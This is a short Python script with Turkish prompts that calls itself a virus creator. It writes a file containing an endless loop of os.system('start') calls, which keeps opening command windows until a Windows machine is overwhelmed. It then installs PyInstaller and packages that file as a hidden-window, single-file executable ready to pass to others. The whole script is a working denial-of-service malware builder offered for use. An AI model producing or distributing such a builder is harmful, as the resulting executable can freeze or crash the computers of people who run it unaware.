import os

ad = input("Virus adını giriniz > ")
dosya = open(ad+".py","a")
butun = (ad+".py")


dosya.write('''import os
while True:
	os.system("start")
''')
os.system("pip install pyinstaller")
os.system("pyinstaller --onefile -w "+butun)
print("\n Virüsünüz oluşturuldu!")
print("Virüsünüzün exe hali ve py hali bulunduğu dizinde!")

